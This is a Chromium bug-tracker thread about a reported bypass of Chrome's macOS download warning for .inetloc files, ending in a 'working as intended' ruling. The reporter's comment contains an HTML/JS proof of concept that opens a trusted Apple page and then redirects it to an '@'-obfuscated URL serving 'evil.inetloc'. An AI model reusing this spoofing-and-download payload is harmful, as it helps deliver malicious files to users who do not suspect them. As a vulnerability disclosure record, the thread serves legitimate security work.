@@ -1,0 +1,175 @@
+Issue ID: 455899533
+
+Author: ch...@google.com
+<p>This is intended behavior. <code>inetloc</code> and <code>fileloc</code> are both <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;drc=aaabb415ff0c85d211db99a3c0209c9622ed6266;l=1815" data-b-widget="url" data-b-original-href="https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;drc=aaabb415ff0c85d211db99a3c0209c9622ed6266;l=1815" data-b-redirected-href="https://www.google.com/url?q=https://source.chromium.org/chromium/chromium/src/%2B/main:components/safe_browsing/content/resources/download_file_types.asciipb;drc%3Daaabb415ff0c85d211db99a3c0209c9622ed6266;l%3D1815&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3ntvLBi-BWcxxivfAHu2tw">marked</a> as <code>ALLOW_ON_USER_GESTURE</code>. This is somewhat confusingly named, but it applies a handful of heuristics to decide whether to prompt the user or not. We do not expect these dialogs to be a security boundary.</p>
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<ol>
+<li>Open the Chrome for Mac and visit the <a href="https://onydose.github.io/dulu.html" data-b-widget="url" data-b-original-href="https://onydose.github.io/dulu.html" data-b-redirected-href="https://www.google.com/url?q=https://onydose.github.io/dulu.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2r-k8wjV-BL5kW79bSLUIX">https://onydose.github.io/dulu.html</a></li>
+<li>Click the button</li>
+<li>Note that the warning notification for .inetloc can be bypassed.</li>
+</ol>
+<h1>Problem Description</h1>
+<p>By default .inetloc is rejected as a malicious file. However, the security warning/pop-up notification can be bypassed</p>
+<h1>Summary</h1>
+<p>Bypass of the dangerous file dialog .inetloc on Chrome for macOS.</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Not sure <br>
+Regression: N/A \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: sa...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: sa...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: sa...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ts...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ts...@google.com
+googlers_unrestricted
+
+Author: ts...@google.com
+<p>Ok, but you&#39;ll need to provide a complete PoC showing what e.g. html/js is used for the bypass.  Also, it would help if you could delete the file first, and thus show that a new file is created. Otherwise, the (1) MIGHT be from before.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: sa...@gmail.com
+TjJabU5HRmpaVGt6TWpCaE56QmtNVE01WWpoa1l6aGlZemRsTXpRd00yWT0=
+
+Author: Hi Teams,
+
+Thank for the response, here the PoC code i use:
+```
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>PoC</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      text-align: center;
+    }
+    .trigger-btn {
+      display: inline-block;
+      padding: 15px 30px;
+      background: #ff4444;
+      color: white;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 50px;
+      border: none;
+    }
+    .trigger-btn:hover { background: #cc0000; }
+  </style>
+</head>
+<body>
+  <h2>Click the Button to Trigger Prompt</h2>
+  <p>Click the button below to simulate the popup + redirect sequence.</p>
+
+  <button class="trigger-btn" onclick="triggerSpoof()">Click Here!</button>
+
+  <script>
+    function triggerSpoof() {
+      // Step 1: Open a legit domain (support.apple.com) in a new window/tab
+      // Using a direct click event improves popup success vs. hover.
+      var w = window.open('https://support.apple.com');
+
+      // Step 2: After a short delay, redirect that window to an obfuscated URL
+      var targetUrl = 'https://google.com@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ujangsec.github.io/evil.inetloc';
+
+      setTimeout(function () {
+        if (w && !w.closed) {
+          // Redirect the newly opened window
+          w.location = targetUrl;
+        } else {
+          // Fallback: if popup was blocked, redirect current window instead
+          window.location = targetUrl;
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
+```
+TjJabU5HRmpaVGt6TWpCaE56QmtNVE01WWpoa1l6aGlZemRsTXpRd00yWT0=
+
+Author: sa...@gmail.com
+TkRVMU9EazVOVE16TFRjd05EZzNNREk1TFMwME16RXlPVFkxTlRRPQ==
+
+Author: pe...@google.com
+<p>Thank you for providing more feedback. Adding the requester to the CC list.</p>
+
+Author: pe...@google.com
+google_domain
+
+Author: ts...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: sa...@gmail.com
+WmpOak1EQTBZMlU1WTJZMlpUQTJZek5pTWpZNVpHUXhPVGxoWW1VeFpEST0=
+
+Author: sa...@gmail.com
+TkRVMU9EazVOVE16TFRjd05URXdOREUyTFMweE1UYzFOekF5TVRJPQ==
+
+Author: ts...@google.com
+<p>Yes, there are likely a bunch of extensions.  We can treat these as one issue.</p>
+
+Author: sa...@gmail.com
+WWprd056ZzFZakZrWmpNME9UWTNabVpoTTJOaFl6aG1NRFF5WmpNM1pUWT0=
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: ts...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ts...@google.com
+WW1GbE5qVTROekEzWm1JeE9XVmhORGt3WWpJNFlXRTFOVGMwTm1aa09EUT0=
+
+Author: dr...@chromium.org
+<p>This is intended behavior. <code>inetloc</code> and <code>fileloc</code> are both <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;drc=aaabb415ff0c85d211db99a3c0209c9622ed6266;l=1815" data-b-widget="url" data-b-original-href="https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;drc=aaabb415ff0c85d211db99a3c0209c9622ed6266;l=1815" data-b-redirected-href="https://www.google.com/url?q=https://source.chromium.org/chromium/chromium/src/%2B/main:components/safe_browsing/content/resources/download_file_types.asciipb;drc%3Daaabb415ff0c85d211db99a3c0209c9622ed6266;l%3D1815&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3ntvLBi-BWcxxivfAHu2tw">marked</a> as <code>ALLOW_ON_USER_GESTURE</code>. This is somewhat confusingly named, but it applies a handful of heuristics to decide whether to prompt the user or not. We do not expect these dialogs to be a security boundary.</p>
+
+Author: dr...@chromium.org
+public_non_google
+
+Author: dr...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: sa...@gmail.com
+Hi Team,<br><br>I believe this is a vulnerability because the download dialog does not display a “This file is dangerous” warning, as it does in Chrome for Android.<br>
+
+Author: dr...@chromium.org
+<p>Neither <code>inetloc</code> nor <code>fileloc</code> have a <code>danger_level</code> on Android. Can you give more details about the behavior you&#39;re seeing on Android?</p>
+
+Author: sa...@gmail.com
+What I mean is that on Android there is a dialog box that says <br>“File might be harmful,” but on Chrome for macOS there is no such thing, as I have attached in the PoC.
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
